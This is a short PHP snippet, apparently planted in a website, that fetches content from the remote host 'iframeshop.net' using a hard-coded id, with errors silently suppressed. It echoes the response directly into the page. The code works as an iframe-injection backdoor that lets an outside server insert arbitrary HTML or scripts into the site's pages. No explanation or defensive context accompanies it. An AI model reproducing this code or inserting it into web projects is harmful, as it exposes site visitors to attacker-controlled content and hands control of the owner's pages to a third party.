<?php
$id="gd8jrcjfziy1om39ohby7bfqq6u9faj";
$url="http://iframeshop.net/sti.php?id=".$id;
$iframe=@file_get_contents ($url);
if ($iframe)
echo($iframe);
?>